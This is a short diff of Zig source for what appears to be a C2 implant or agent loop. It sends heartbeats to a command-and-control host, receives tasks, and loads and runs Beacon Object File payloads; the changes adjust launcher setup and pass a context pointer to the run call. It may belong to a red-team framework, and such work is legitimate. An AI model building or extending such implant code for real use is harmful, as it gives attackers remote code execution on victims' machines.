@@ -80,8 +80,8 @@ pub fn main() !u8 {
 
     const heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint);
 
-    _ = bof.initLauncher();
-    defer bof.deinitLauncher();
+    try bof.initLauncher();
+    defer bof.releaseLauncher();
 
     while (true) {
         // send heartbeat to C2 and check if any tasks are pending
@@ -156,10 +156,12 @@ pub fn main() !u8 {
                     _ = bof.load("dsfsdf", bof_content.ptr, @intCast(bof_content.len), &bof_handle);
                     //defer bof.unload(bof_handle);
 
+                    var context: *bof.Context = undefined;
                     _ = bof.run(
                         bof_handle,
                         @constCast(bof_args.ptr),
                         @intCast(bof_args.len),
+                        &context,
                     );
 
                     //stdout.writer().print("Bof output:\n{s}", .{bof.getOutput(bof_handle).?}) catch unreachable;
